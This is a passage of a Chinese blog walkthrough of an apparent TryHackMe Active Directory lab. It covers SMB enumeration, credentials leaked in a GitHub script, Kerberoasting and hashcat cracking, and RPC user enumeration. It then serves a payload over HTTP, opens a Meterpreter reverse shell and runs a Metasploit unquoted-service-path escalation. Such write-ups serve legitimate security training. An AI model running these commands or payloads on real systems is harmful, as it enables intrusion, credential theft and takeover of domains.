D        0  Fri Mar 12 10:11:51 2021<br>  Default                           DHR        0  Fri Mar 12 08:18:03 2021<br>  Default User                    DHSrn        0  Sat Sep 15 15:28:48 2018<br>  desktop.ini                       AHS      174  Sat Sep 15 15:16:48 2018<br>  LAB-ADMIN                           D        0  Fri Mar 12 08:28:14 2021<br>  Public                             DR        0  Fri Mar 12 05:27:02 2021<br></code></pre></td></tr></table></figure><p>这做字典也不够啊。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">atlbitbucket<br>bitbucket<br>LAB-ADMIN<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.251.132/Docs -U <span class="hljs-string">&quot;&quot;</span><br>Enter WORKGROUP\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Mon Mar 15 10:47:35 2021</span><br><span class="hljs-string">  ..                                  D        0  Mon Mar 15 10:47:35 2021</span><br><span class="hljs-string">  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 10:46:54 2021</span><br><span class="hljs-string">  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 10:45:24 2021</span><br><span class="hljs-string"></span><br><span class="hljs-string">15587583 blocks of size 4096. 9929074 blocks available</span><br><span class="hljs-string">smb: \&gt; mget *</span><br></code></pre></td></tr></table></figure><p>两个文档都是加密的。跑半天没跑出来。nmap还扫到一个域名，通过7990端口能够正常访问：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220712153657372.png" alt="image-20220712153657372"></p><p>在Github中搜寻目标公司，在历史记录里能够看到一个powershell脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> ActiveDirectory<br><span class="hljs-variable">$userName</span> = <span class="hljs-string">&#x27;nik&#x27;</span><br><span class="hljs-variable">$userPassword</span> = <span class="hljs-string">&#x27;ToastyBoi!&#x27;</span><br><span class="hljs-variable">$psCreds</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$userPassword</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$Computers</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> <span class="hljs-string">&quot;System.Collections.ArrayList&quot;</span><br><span class="hljs-variable">$Computer</span> = <span class="hljs-variable">$</span>(<span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> * | <span class="hljs-built_in">Select-Object</span> Name)<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-literal">-1</span>; <span class="hljs-variable">$index</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$Computer</span>.count; <span class="hljs-variable">$index</span>++) &#123; <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-variable">$index</span> &#123;systeminfo&#125; &#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.251.132 -u nik -p <span class="hljs-string">&#x27;ToastyBoi!&#x27;</span><br>SMB         10.10.251.132   445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)<br>SMB         10.10.251.132   445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! <br></code></pre></td></tr></table></figure><p>但是登录不了winrm：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">WINRM       10.10.251.132   5985   LAB-DC           [*] Windows 10.0 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM)<br>WINRM       10.10.251.132   5985   LAB-DC           [*] http://10.10.251.132:5985/wsman<br>WINRM       10.10.251.132   5985   LAB-DC           [-] LAB.ENTERPRISE.THM\nik:ToastyBoi!<br></code></pre></td></tr></table></figure><p>有一个账号密码可以去申请当前账号能够访问的SPN服务票据，发动Kerberoasting：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.10.251.132 <span class="hljs-string">&#x27;LAB.ENTERPRISE.THM/nik:ToastyBoi!&#x27;</span><br>Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation<br><br>ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation <br>--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------<br>HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 09:20:01.333272  2021-04-26 23:16:41.570158             <br><br><br><br>[-] CCache file is not found. Skipping...<br>$ <span class="hljs-built_in">cat</span> kerberoastables.txt <br>$krb5tgs$23$*bitbucket<span class="hljs-variable">$LAB</span>.ENTERPRISE.THM<span class="hljs-variable">$LAB</span>.ENTERPRISE.THM/bitbucket*$bc046c4c066ff99b622d84378a594dad<span class="hljs-variable">$16fc2d0bf83bca6a3c85ec1360c5de1566d4e03a0a5c8ac008eee9f9c2447b38c5ed1aebe167eefdb3c9a8ca752ee191b497c1603579495a9842b29dcb6721799d7452274adca18ccdb2e43a1af0dda19ecc300bfcaa123da5a3013d34037c988622a963c29935718902ac24de4807abb9aebf47d6b63b01360e48c1f679a3a4aa5e16805ecdea88db6819617b4792db2ec2481d8710736be8aa64fd8568c1fb51c06588c9fd8c701aac8dccdd8e99b9e3172cb92573801c20068ab16f784135d22c905075c6c5b1eea6056093443c50b4833d0b56d39b0f58ab3bc52b91f222e04dfc1d25633e5a7000009c4ccf0593dc3b011b6e0a1e992724849cceb290325a79bad2a16dc6e0b64ec4074f5a566c02ce4990214730637b843bd988561bf549c6362f96b43c2d9653aab319f59450b2c1c847b6e44bb6445cb5b0a07cedbc09ae427481094f2372f437017fdc7b9042ab69a41c1fea265143669017ccc10733b8493d8898bbf6fbab4bdca0f007c7134425c2cef5eda1b896a4ae9d1ecb8ed82c903df6152b85650a24e2202d55498fd319c5e2c1a6f018667400d12bd881298193f17ef2228d00023740073f3fbb74e998c96ec93144402c9fc8711323d2f0368530a83da26cc431ffb3c36749e207347e996617c8de3e5752d013b038412b99a83388da88cc719e67fe719c1b74de4dd7b6b3de76cb5350ec262880bf770c8005e6b4041632c178f4ac7e299206fab6c03afeec11a0408323fcdf5f7912e8fb6b08d9b27e2f6ce2b92a21bd5fd683f72aa8c0e290e53a3ede5782544ffa382615beeab7b90ad275abf9955652b100564a2fa6dfb4bdde5cfb387eff368c27a79bddbe3345d2dcd770c59a0142952fd8414c02f54400c69fdc1d0ee2642273226df07a0429721d266d273c0c172116891935640237d2e2ba91e764aec16f812f3198c01f5646e094c3f41846b39b37e4baa8468160cfa2becd5669f616d0cf247bf1cada86d14a6b4ca0f3e8697c3f9b720e160a7be627846ab0de41d4cbf82d7220d001ffb377a8676aff35a9b8747d619ad7c1258f0c163e9cdccabaaf98ea5436b2e2ca72ab6936d003373d2742d46d0306c1148ccf6a3048bfb60a6e9eadacd2408d74c0162d050e2249d23130c21880c56e188ff6811e3b5e3b012d8ca6ee0f5cb4d8fd7770a7125a98295e2eed1ac41b9eb2cd84cc3feeaeb4a34260726b3772e3db8f6cbfaf802c80394a63edb32714427f4f6fb25badee1007e619e7fcec4ad1a61e1f85d0568214f5c1263f4d739e0fa784fc7096d20e2bfd0954fe04cb44ab8a1ea13c07ea7dc85c4817a8f230eebac933215d27fd05b095729224f5</span><br><br>$ hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt<br>hashcat (v6.1.1) starting...<br><br>OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>=============================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 13715/13779 MB (4096 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Applicable optimizers applied:<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Using pure kernels enables cracking longer passwords but <span class="hljs-keyword">for</span> the price of drastically reduced performance.<br>If you want to switch to optimized backend kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Hardware monitoring interface not found on your system.<br>Watchdog: Temperature abort trigger disabled.<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 204 MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344385<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br><br>$krb5tgs$23$*bitbucket<span class="hljs-variable">$LAB</span>.ENTERPRISE.THM<span class="hljs-variable">$LAB</span>.ENTERPRISE.THM/bitbucket*$bc046c4c066ff99b622d84378a594dad<span class="hljs-variable">$16fc2d0bf83bca6a3c85ec1360c5de1566d4e03a0a5c8ac008eee9f9c2447b38c5ed1aebe167eefdb3c9a8ca752ee191b497c1603579495a9842b29dcb6721799d7452274adca18ccdb2e43a1af0dda19ecc300bfcaa123da5a3013d34037c988622a963c29935718902ac24de4807abb9aebf47d6b63b01360e48c1f679a3a4aa5e16805ecdea88db6819617b4792db2ec2481d8710736be8aa64fd8568c1fb51c06588c9fd8c701aac8dccdd8e99b9e3172cb92573801c20068ab16f784135d22c905075c6c5b1eea6056093443c50b4833d0b56d39b0f58ab3bc52b91f222e04dfc1d25633e5a7000009c4ccf0593dc3b011b6e0a1e992724849cceb290325a79bad2a16dc6e0b64ec4074f5a566c02ce4990214730637b843bd988561bf549c6362f96b43c2d9653aab319f59450b2c1c847b6e44bb6445cb5b0a07cedbc09ae427481094f2372f437017fdc7b9042ab69a41c1fea265143669017ccc10733b8493d8898bbf6fbab4bdca0f007c7134425c2cef5eda1b896a4ae9d1ecb8ed82c903df6152b85650a24e2202d55498fd319c5e2c1a6f018667400d12bd881298193f17ef2228d00023740073f3fbb74e998c96ec93144402c9fc8711323d2f0368530a83da26cc431ffb3c36749e207347e996617c8de3e5752d013b038412b99a83388da88cc719e67fe719c1b74de4dd7b6b3de76cb5350ec262880bf770c8005e6b4041632c178f4ac7e299206fab6c03afeec11a0408323fcdf5f7912e8fb6b08d9b27e2f6ce2b92a21bd5fd683f72aa8c0e290e53a3ede5782544ffa382615beeab7b90ad275abf9955652b100564a2fa6dfb4bdde5cfb387eff368c27a79bddbe3345d2dcd770c59a0142952fd8414c02f54400c69fdc1d0ee2642273226df07a0429721d266d273c0c172116891935640237d2e2ba91e764aec16f812f3198c01f5646e094c3f41846b39b37e4baa8468160cfa2becd5669f616d0cf247bf1cada86d14a6b4ca0f3e8697c3f9b720e160a7be627846ab0de41d4cbf82d7220d001ffb377a8676aff35a9b8747d619ad7c1258f0c163e9cdccabaaf98ea5436b2e2ca72ab6936d003373d2742d46d0306c1148ccf6a3048bfb60a6e9eadacd2408d74c0162d050e2249d23130c21880c56e188ff6811e3b5e3b012d8ca6ee0f5cb4d8fd7770a7125a98295e2eed1ac41b9eb2cd84cc3feeaeb4a34260726b3772e3db8f6cbfaf802c80394a63edb32714427f4f6fb25badee1007e619e7fcec4ad1a61e1f85d0568214f5c1263f4d739e0fa784fc7096d20e2bfd0954fe04cb44ab8a1ea13c07ea7dc85c4817a8f230eebac933215d27fd05b095729224f5</span>:littleredbucket<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitbucket：littleredbucket<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.251.132/Users -U bitbucket<br>Enter WORKGROUP\bitbucket<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; </span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                  DR        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  ..                                 DR        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Administrator                       D        0  Fri Mar 12 05:55:48 2021</span><br><span class="hljs-string">  All Users                       DHSrn        0  Sat Sep 15 15:28:48 2018</span><br><span class="hljs-string">  atlbitbucket                        D        0  Fri Mar 12 06:53:06 2021</span><br><span class="hljs-string">  bitbucket                           D        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  Default                           DHR        0  Fri Mar 12 08:18:03 2021</span><br><span class="hljs-string">  Default User                    DHSrn        0  Sat Sep 15 15:28:48 2018</span><br><span class="hljs-string">  desktop.ini                       AHS      174  Sat Sep 15 15:16:48 2018</span><br><span class="hljs-string">  LAB-ADMIN                           D        0  Fri Mar 12 08:28:14 2021</span><br><span class="hljs-string">  Public                             DR        0  Fri Mar 12 05:27:02 2021</span><br><span class="hljs-string">cd </span><br><span class="hljs-string">15587583 blocks of size 4096. 9927505 blocks available</span><br><span class="hljs-string">smb: \&gt; cd bitbucket\</span><br><span class="hljs-string">smb: \bitbucket\&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  ..                                  D        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  3D Objects                         DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  AppData                            DH        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Application Data                DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Contacts                           DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  Cookies                         DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Desktop                            DR        0  Mon Mar 15 10:49:48 2021</span><br><span class="hljs-string">  Documents                          DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  Downloads                          DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  Favorites                          DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  Links                              DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  Local Settings                  DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Music                              DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  My Documents                    DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  NetHood                         DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  NTUSER.DAT                        AHn   786432  Tue Jul 12 14:27:45 2022</span><br><span class="hljs-string">  ntuser.dat.LOG1                   AHS        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  ntuser.dat.LOG2                   AHS   209920  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  NTUSER.DAT&#123;1c3790b4-b8ad-11e8-aa21-e41d2d101530&#125;.TM.blf    AHS    65536  Fri Mar 12 10:15:15 2021</span><br><span class="hljs-string">  NTUSER.DAT&#123;1c3790b4-b8ad-11e8-aa21-e41d2d101530&#125;.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  NTUSER.DAT&#123;1c3790b4-b8ad-11e8-aa21-e41d2d101530&#125;.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  ntuser.ini                         HS       20  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Pictures                           DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  PrintHood                       DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Recent                          DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Saved Games                        DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  Searches                           DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  SendTo                          DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Start Menu                      DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Templates                       DHSrn        0  Fri Mar 12 10:11:49 2021</span><br><span class="hljs-string">  Videos                             DR        0  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string"></span><br><span class="hljs-string">15587583 blocks of size 4096. 9927505 blocks available</span><br><span class="hljs-string">smb: \bitbucket\&gt; cd Desktop\</span><br><span class="hljs-string">smb: \bitbucket\Desktop\&gt; ls</span><br><span class="hljs-string">  .                                  DR        0  Mon Mar 15 10:49:48 2021</span><br><span class="hljs-string">  ..                                 DR        0  Mon Mar 15 10:49:48 2021</span><br><span class="hljs-string">  desktop.ini                       AHS      282  Fri Mar 12 10:11:51 2021</span><br><span class="hljs-string">  user.txt                            A       37  Mon Mar 15 10:49:51 2021</span><br><span class="hljs-string"></span><br><span class="hljs-string">15587583 blocks of size 4096. 9927505 blocks available</span><br><span class="hljs-string">smb: \bitbucket\Desktop\&gt; get user.txt</span><br></code></pre></td></tr></table></figure><h6 id="Flag2-txt"><a href="#Flag2-txt" class="headerlink" title="Flag2.txt:"></a>Flag2.txt:</h6><p>还是无法登录winrm：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">WINRM       10.10.251.132   5985   LAB-DC           [*] Windows 10.0 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM)<br>WINRM       10.10.251.132   5985   LAB-DC           [*] http://10.10.251.132:5985/wsman<br>WINRM       10.10.251.132   5985   LAB-DC           [-] LAB.ENTERPRISE.THM\bitbucket:littleredbucket<br></code></pre></td></tr></table></figure><p>可以连RPC去查询一下域内信息：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ rpcclient 10.10.251.132 -U bitbucket<br>Enter WORKGROUP\bitbucket&#x27;s password:<br>rpcclient $&gt; enumdomusers <br>user:<span class="hljs-comment">[Administrator]</span> rid:<span class="hljs-comment">[0x1f4]</span><br>user:<span class="hljs-comment">[Guest]</span> rid:<span class="hljs-comment">[0x1f5]</span><br>user:<span class="hljs-comment">[krbtgt]</span> rid:<span class="hljs-comment">[0x1f6]</span><br>user:<span class="hljs-comment">[atlbitbucket]</span> rid:<span class="hljs-comment">[0x3e8]</span><br>user:<span class="hljs-comment">[bitbucket]</span> rid:<span class="hljs-comment">[0x452]</span><br>user:<span class="hljs-comment">[nik]</span> rid:<span class="hljs-comment">[0x453]</span><br>user:<span class="hljs-comment">[replication]</span> rid:<span class="hljs-comment">[0x454]</span><br>user:<span class="hljs-comment">[spooks]</span> rid:<span class="hljs-comment">[0x455]</span><br>user:<span class="hljs-comment">[korone]</span> rid:<span class="hljs-comment">[0x456]</span><br>user:<span class="hljs-comment">[banana]</span> rid:<span class="hljs-comment">[0x457]</span><br>user:<span class="hljs-comment">[Cake]</span> rid:<span class="hljs-comment">[0x458]</span><br>user:<span class="hljs-comment">[contractor-temp]</span> rid:<span class="hljs-comment">[0x45c]</span><br>user:<span class="hljs-comment">[varg]</span> rid:<span class="hljs-comment">[0x45d]</span><br>user:<span class="hljs-comment">[joiner]</span> rid:<span class="hljs-comment">[0x45f]</span><br>rpcclient $&gt;<br></code></pre></td></tr></table></figure><p>只是一个普通域用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; queryuser bitbucket<br>User Name   :bitbucket<br>Full Name   :BitBucket<br>Home Drive  :<br>Dir Drive   :<br>Profile Path:<br>Logon Script:<br>Description :<br>Workstations:<br>Comment     :<br>Remote Dial :<br>Logon Time               :一, 26 4月 2021 23:16:42 CST<br>Logoff Time              :四, 01 1月 1970 08:00:00 CST<br>Kickoff Time             :四, 14 9月 30828 10:48:05 CST<br>Password last <span class="hljs-built_in">set</span> Time   :五, 12 3月 2021 09:20:01 CST<br>Password can change Time :六, 13 3月 2021 09:20:01 CST<br>Password must change Time:四, 14 9月 30828 10:48:05 CST<br>unknown_2[0..31]...<br>user_rid :0x452<br>group_rid:0x201<br>acb_info :0x00000210<br>fields_present:0x00ffffff<br>logon_divs:168<br>bad_password_count:0x00000000<br>logon_count:0x0000001b<br>padding1[0..7]...<br>logon_hrs[0..21]...<br>rpcclient $&gt; querygroup 0x201<br>Group Name:Domain Users<br>Description:All domain <span class="hljs-built_in">users</span><br>Group Attribute:7<br>Num Members:14<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.10.251.132 <span class="hljs-string">&#x27;LAB.ENTERPRISE.THM/bitbucket:littleredbucket&#x27;</span><br>Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation<br><br>ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation <br>--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------<br>HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 09:20:01.333272  2021-04-26 23:16:41.570158             <br><br><br><br>[-] CCache file is not found. Skipping...<br></code></pre></td></tr></table></figure><p>就这一个账号。RDP可以登录。远程登录上去并没有发现微软安全中心。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220712163932959.png" alt="image-20220712163932959"></p><p>它自己就是关闭的，可以直接利用msf提权模块了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo python -m http.server 80<br>[sudo] crazyinside 的密码：<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.160.208 - - [12/Jul/2022 16:44:43] <span class="hljs-string">&quot;GET /shell.exe HTTP/1.1&quot;</span> 200<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Started reverse TCP handler on 10.11.75.230:4444 <br>[*] Sending stage (200774 bytes) to 10.10.160.208<br>[*] Meterpreter session 1 opened (10.11.75.230:4444 -&gt; 10.10.160.208:50253) at 2022-07-12 16:45:00 +0800<br><br>(Meterpreter 1)(C:\Users\bitbucket) backgroud<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">[msf](Jobs:0 Agents:1) exploit(windows/local/unquoted_service_path) &gt;&gt; <span class="hljs-built_in">set</span> LHOST 10.11.75.230<br>LHOST =&gt; 10.11.75.230<br>[msf](Jobs:0 Agents:1) exploit(windows/local/unquoted_service_path) &gt;&gt; <span class="hljs-built_in">set</span> session 2<br>session =&gt; 2<br>[msf](Jobs:0 Agents:1) exploit(windows/local/unquoted_service_path) &gt;&gt; run<br><br>[*] Started reverse TCP handler on 10.11.75.230:4444 <br>[*] Finding a vulnerable service...<br>[*] Attempting exploitation of zerotieroneservice<br>[*] Placing C:\Program Files 